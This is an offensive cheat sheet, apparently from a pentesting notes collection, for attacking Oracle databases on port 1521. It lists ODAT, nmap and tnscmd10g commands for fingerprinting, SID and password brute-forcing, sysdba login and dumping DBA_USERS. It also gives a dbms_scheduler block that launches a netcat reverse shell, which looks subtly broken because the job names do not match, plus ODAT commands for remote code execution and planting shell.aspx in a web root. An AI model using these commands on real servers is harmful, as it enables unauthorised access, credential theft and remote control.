# Oracle 

Oracle default port: `1521/tcp`

> Install 

    yay -S tnscmd10g
    yay -S oracle-instantclient-sqlplus

> ODAT

    odat all -s TARGET_IP-p 1521

    odat passwordguesser -s TARGET_IP -p 1521 -d SID --accounts-file accounts/accounts_multiple.txt


> Status 

    tnscmd10g status -h TARGET_IP
> Fingerprint Oracle TNS Version

    tnscmd10g version -h TARGET_IP
    nmap --script=oracle-tns-version TARGET_IP

> Brute

    nmap --script=oracle-sid-brute TARGET_IP
    nmap --script=oracle-brute TARGET_IP
> Oscanner

    oscanner -s TARGET_IP -P 1521 

## Client 

> sqlplus

    sqlplus USERNAME/PASSWORD@TARGET_IP:PORT/SID


    sqlplus USERNAME/PASSWORD@TARGET_IP:PORT/SID 'as sysdba'

### Client with GUI

    DBeaver

# Queries 

```SQL
SELECT * FROM session_privs; 
SELECT USERNAME PASSWORD FROM DBA_USERS; 
```


## RCE 

> Get Oracle Reverse os-shell


```SQL
begin
dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
    'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
    SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET_IP');
dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
dbms_scheduler.enable('rev_shell'); 
end; 
```

    sqlplus USERNAME/PASSWORD@TARGET_IP:PORT/SID

> Execute Code via Java Stored Procedure

    odat java -s TARGET_IP -U USERNAME -P PASSWORD -d SID --exec COMMAND


> Execute code via External Tables

```zsh
odat externaltable -s TARGET_IP -U USERNAME -P PASSWORD -d SID --exec "C:/windows/system32" "calc.exe"
```
> Upload file
```zsh
odat dbmsxslprocessor -s TARGET_IP -U USERNAME -P PASSWORD -d SID --sysdba --putFile "c:\\inetpub\\wwwroot" "shell.aspx" "/tmp/shell.aspx"
```
